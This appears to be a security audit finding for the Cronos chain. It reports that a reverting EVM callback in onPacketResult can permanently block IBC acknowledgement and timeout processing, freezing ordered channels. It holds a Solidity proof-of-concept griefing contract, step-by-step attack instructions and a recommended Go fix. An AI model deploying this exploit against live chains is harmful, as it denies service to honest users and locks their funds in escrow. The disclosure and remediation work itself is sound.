### Title
Reverting EVM Callback in `onPacketResult` Permanently Blocks IBC Acknowledgement/Timeout Processing on Ordered Channels — (`File: x/cronos/keeper/keeper.go`)

### Summary
`onPacketResult` calls an EVM contract's `onPacketResultCallback` and propagates any revert as a hard error to the IBC packet-processing layer. An unprivileged user can deploy a contract whose callback always reverts, permanently preventing acknowledgement or timeout packets from being processed. On ordered IBC channels this halts the channel entirely.

### Finding Description

`onPacketResult` is the shared implementation for both `IBCOnAcknowledgementPacketCallback` and `IBCOnTimeoutPacketCallback`: [1](#0-0) 

After verifying that the packet sender matches the contract address, it calls `CallEVM` to invoke `OnPacketResultCallback` on the contract: [2](#0-1) 

If the EVM execution reverts (`res.Failed()`), the function returns a non-nil error. That error propagates directly out of `IBCOnAcknowledgementPacketCallback` and `IBCOnTimeoutPacketCallback`: [3](#0-2) 

The IBC callback middleware (ibc-go v11) treats a non-nil return from these hooks as a fatal error and reverts the entire packet-processing transaction. For **ordered channels**, IBC requires packets to be acknowledged/timed-out in sequence; a single permanently-failing packet halts the channel, blocking all subsequent transfers.

There is no `recover`, no log-and-continue, and no fallback path analogous to the intentional "log and continue" pattern used in the conversion middleware's refund paths: [4](#0-3) 

### Impact Explanation

**High** — Permanent or long-lived inability for honest users to process valid IBC transfers.

On an ordered channel, once a malicious contract's callback permanently reverts, every relayer attempt to submit the acknowledgement or timeout for that packet fails. The channel is frozen: no subsequent packet on that channel can be processed until the stuck packet is cleared, which is impossible without a governance intervention or channel close.

On unordered channels the specific packet is permanently stuck (funds locked in escrow), but the channel itself continues.

### Likelihood Explanation

Any unprivileged user can:
1. Deploy an EVM contract whose `onPacketResultCallback` unconditionally reverts (one line of Solidity).
2. Use that contract to send a single IBC packet (via `__CronosSendToIbc` event or the IBC precompile), registering the contract as the packet sender so the sender-address check at line 420 passes.
3. Wait for the packet to be acknowledged or time out.

No special permissions, leaked keys, or governance access are required.

### Recommendation

Mirror the "log and continue" pattern already used in the conversion middleware's refund paths. Wrap the `CallEVM` call in `onPacketResult` so that a reverting callback is logged and swallowed rather than propagated:

```go
_, res, err := k.CallEVM(ctx, &senderAddr, data, big.NewInt(0), gasLimit)
if err != nil || res.Failed() {
    vmErr := ""
    if res != nil { vmErr = res.VmError }
    k.Logger(ctx).Error("IBC callback EVM execution failed",
        "contract", senderAddr,
        "channel", packet.SourceChannel,
        "sequence", packet.Sequence,
        "vm_error", vmErr,
        "error", err,
    )
    return nil  // do not block packet processing
}
```

This ensures that a malicious or buggy contract cannot stall IBC packet processing, consistent with the design intent already expressed in the conversion middleware.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICRC20 {
    function send_to_ibc(string memory recipient, uint amount) external;
}

contract MaliciousIBCSender {
    ICRC20 public token;

    constructor(address _token) {
        token = ICRC20(_token);
    }

    // Step 1: attacker calls this to send a packet; contract is the packet sender
    function sendPacket(string calldata recipient, uint amount) external {
        token.send_to_ibc(recipient, amount);
    }

    // Step 2: Cronos calls this when the packet is ack'd or times out
    // Unconditional revert blocks IBCOnAcknowledgementPacketCallback /
    // IBCOnTimeoutPacketCallback, freezing the ordered channel.
    function onPacketResultCallback(
        string calldata /*channelId*/,
        uint64 /*sequence*/,
        bool /*success*/
    ) external pure {
        revert("griefing");
    }
}
```

1. Attacker deploys `MaliciousIBCSender` with a mapped CRC20 token address.
2. Calls `sendPacket` — the `__CronosSendToIbc` EVM log triggers `SendToIbcHandler`, which initiates an IBC transfer with the contract as the Cosmos-side sender.
3. When the relayer submits the acknowledgement (or timeout), `IBCOnAcknowledgementPacketCallback` → `onPacketResult` → `CallEVM` → `onPacketResultCallback` reverts.
4. `onPacketResult` returns `"IBC callback EVM execution reverted: griefing"`.
5. The IBC middleware propagates the error; the acknowledgement transaction is reverted.
6. On an ordered channel, the channel is now frozen for all honest participants.

### Citations

**File:** x/cronos/keeper/keeper.go (L406-436)
```go
func (k Keeper) onPacketResult(
	ctx sdk.Context,
	packet channeltypes.Packet,
	acknowledgement bool,
	relayer sdk.AccAddress,
	contractAddress,
	packetSenderAddress string,
) error {
	sender, err := sdk.AccAddressFromBech32(packetSenderAddress)
	if err != nil {
		return fmt.Errorf("invalid bech32 address: %s, err: %w", packetSenderAddress, err)
	}
	senderAddr := common.BytesToAddress(sender)
	contractAddr := common.HexToAddress(contractAddress)
	if senderAddr != contractAddr {
		return fmt.Errorf("sender is not authenticated: expected %s, got %s", senderAddr, contractAddr)
	}
	data, err := cronosprecompiles.OnPacketResultCallback(packet.SourceChannel, packet.Sequence, acknowledgement)
	if err != nil {
		return err
	}
	gasLimit := k.GetParams(ctx).MaxCallbackGas
	_, res, err := k.CallEVM(ctx, &senderAddr, data, big.NewInt(0), gasLimit)
	if err != nil {
		return err
	}
	if res.Failed() {
		return fmt.Errorf("IBC callback EVM execution reverted: %s", res.VmError)
	}
	return nil
}
```

**File:** x/cronos/keeper/keeper.go (L438-463)
```go
func (k Keeper) IBCOnAcknowledgementPacketCallback(
	ctx sdk.Context,
	packet channeltypes.Packet,
	acknowledgement []byte,
	relayer sdk.AccAddress,
	contractAddress,
	packetSenderAddress string,
	version string,
) error {
	var res channeltypes.Acknowledgement
	if err := k.cdc.UnmarshalJSON(acknowledgement, &res); err != nil {
		return err
	}
	return k.onPacketResult(ctx, packet, res.Success(), relayer, contractAddress, packetSenderAddress)
}

func (k Keeper) IBCOnTimeoutPacketCallback(
	ctx sdk.Context,
	packet channeltypes.Packet,
	relayer sdk.AccAddress,
	contractAddress,
	packetSenderAddress string,
	version string,
) error {
	return k.onPacketResult(ctx, packet, false, relayer, contractAddress, packetSenderAddress)
}
```

**File:** x/cronos/middleware/conversion_middleware.go (L178-189)
```go
					true,
				); err != nil {
					// Intentional: log and continue so the IBC refund is not blocked.
					// Sender keeps the refunded IBC vouchers and can retry conversion manually.
					im.cronoskeeper.Logger(ctx).Error(
						"failed to convert refund vouchers on acknowledgement",
						"denom", denom,
						"sender", data.Sender,
						"error", err,
					)
				}
			}
```
